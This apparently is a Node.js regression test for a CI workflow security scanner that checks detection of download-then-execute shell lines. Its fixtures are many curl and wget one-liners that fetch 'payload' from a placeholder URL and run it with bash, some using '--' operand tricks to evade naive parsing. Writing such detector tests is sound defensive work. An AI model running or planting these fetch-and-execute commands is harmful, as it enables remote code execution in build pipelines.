'use strict';
// Regression for option operands identical to the -- end-of-options marker.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/file';
function workflow(script){
 const yaml=['on: push','permissions: read-all','jobs:','  p:','    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/round15.yml'});
}
for(const [name,script] of [
 ['curl user-agent short','curl -A -- -o payload '+U+'; bash payload'],
 ['curl user-agent long','curl --user-agent -- --output payload '+U+'; bash payload'],
 ['curl user-agent quoted',"curl -A '--' -o payload "+U+"; bash payload"],
 ['curl header short','curl -H -- -o payload '+U+'; bash payload'],
 ['curl header long','curl --header -- -o payload '+U+'; bash payload'],
 ['curl cookie argument','curl -b -- -o payload '+U+'; bash payload'],
 ['curl output-dir after data','curl -A -- -o payload '+U+'; sh payload'],
 ['wget user-agent short','wget -U -- -O payload '+U+'; bash payload'],
 ['wget user-agent long','wget --user-agent -- --output-document=payload '+U+'; bash payload'],
 ['wget user-agent quoted',"wget -U '--' -O payload "+U+"; bash payload"],
 ['wget referer short','wget --referer -- -O payload '+U+'; bash payload'],
 ['wget output before terminator','wget -q -O payload -- -O safe '+U+'; bash payload']
])test('round15 detects '+name,()=>{
 const direct=findingsForScript(script);
 assert.ok(direct.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name+JSON.stringify(direct));
 const scan=workflow(script);
 assert.ok(scan.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),name+JSON.stringify(scan));
});
for(const [name,script] of [
 ['curl real terminator','curl -- -o payload '+U+'; bash payload'],
 ['wget real terminator','wget -- -O payload '+U+'; bash payload'],
 ['curl non-execution','curl -A -- -o payload '+U+'; echo payload'],
 ['wget non-execution','wget -U -- -O payload '+U+'; echo payload'],
 ['curl output elsewhere','curl -A -- -o safe '+U+'; bash payload'],
 ['wget output elsewhere','wget -U -- -O safe '+U+'; bash payload'],
 ['curl data string quote',"curl -H 'X: -- -o payload' -o safe "+U+"; bash payload"],
 ['wget data string quote',"wget -U 'Agent -- -O payload' -O safe "+U+"; bash payload"]
])test('round15 harmless '+name,()=>{
 assert.ok(!findingsForScript(script).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
 assert.ok(!workflow(script).findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),name);
});
